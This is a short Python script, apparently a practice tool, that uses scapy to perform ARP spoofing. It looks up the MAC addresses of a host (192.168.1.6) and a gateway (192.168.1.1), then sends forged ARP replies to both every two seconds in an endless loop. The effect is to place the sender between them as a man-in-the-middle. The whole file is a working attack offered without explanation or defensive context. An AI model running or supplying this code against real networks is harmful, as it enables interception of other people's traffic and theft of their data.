from scapy.all import srp,send,ARP
import scapy.all as scapy
import time

# def get_mac(ip):
#     arp_request = scapy.ARP(pdst=ip)
#     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
#     arp_request_broadcast = broadcast/arp_request
#     answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]

#     # print(answered_list[0][1].hwsrc)
#     return (answered_list[0][1].hwsrc)

    # client_list = [0]
    # for element in answered_list:
    #     client_dict = {"ip":element[1].psrc,"mac":element[1].hwsrc}
    #     client_list.append(client_dict)
    # return client_list
    
def get_mac(ip):
    mac = "xx"
    while mac == "xx":
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1 , verbose=False)[0]
            mac = answered_list[0][1].hwsrc
            # print(mac)
        except:
            pass
        finally:
            return mac

def spoof(target_ip,spoof_ip):    
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet,verbose=False)

count = 0 
while True:
    spoof("192.168.1.6","192.168.1.1")
    spoof("192.168.1.1","192.168.1.6")
    print("Packet Counts : ",count)
    count = count + 1
    time.sleep(2)
